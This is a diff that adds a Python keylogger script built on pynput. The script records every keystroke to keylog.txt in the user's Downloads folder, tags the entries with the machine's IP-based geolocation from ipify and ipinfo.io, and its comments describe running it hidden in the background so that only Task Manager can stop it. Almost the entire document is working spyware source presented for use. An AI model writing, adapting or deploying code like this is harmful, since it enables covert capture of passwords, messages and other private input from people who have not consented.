@@ -1,0 +1,68 @@
+# pip install pynput requests
+# Code starts and installs a file called keylog.txt in the download files of windows system
+# after keylogger is installed on system launch with "pythonw.exe "Keylogger Geo.py" this will launch the keylogger in a terminal in a background that can not be closed unless found in Task Manager
+
+import os
+import sys
+import requests
+import logging
+import threading
+from pynput.keyboard import Key, Listener
+import time
+
+# Get the user's home directory
+user_home = os.path.expanduser("~")
+
+# Set the log directory to Downloads
+log_dir = os.path.join(user_home, "Downloads")
+
+# Ensure the directory exists
+os.makedirs(log_dir, exist_ok=True)
+
+# Set up logging
+log_file_path = os.path.join(log_dir, "keylog.txt")
+logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+# Disable the logging of HTTPS connection details
+logging.getLogger("urllib3").setLevel(logging.WARNING)
+
+def geolocate_ip(ip_address):
+    # Use the ipinfo.io API to get geolocation information
+    api_key = "XXXXX"  # Replace with your actual ipinfo.io API key by singing up for a free account 
+    api_url = f"https://ipinfo.io/{ip_address}?token={api_key}"
+    
+    try:
+        response = requests.get(api_url)
+        data = response.json()
+        
+        # Extract relevant geolocation information
+        city = data.get('city', '')
+        region = data.get('region', '')
+        country = data.get('country', '')
+
+        # Log only the relevant geolocation information
+        location_info = f"{city}, {region}, {country}"
+        return location_info
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+# Get the public IP address of the user
+public_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']
+# Geolocate the IP address using ipinfo.io
+location_info = geolocate_ip(public_ip)
+
+def on_press(key, location_info):
+    logging.info(str(key))
+    logging.info(f"Geolocation: {location_info}")
+
+# Create a separate thread for the Listener
+listener_thread = threading.Thread(target=lambda: Listener(on_press=lambda key: on_press(key, location_info)).start(), daemon=True)
+listener_thread.start()
+
+# Keep the main script running
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    # Handle keyboard interrupt if needed
+    pass
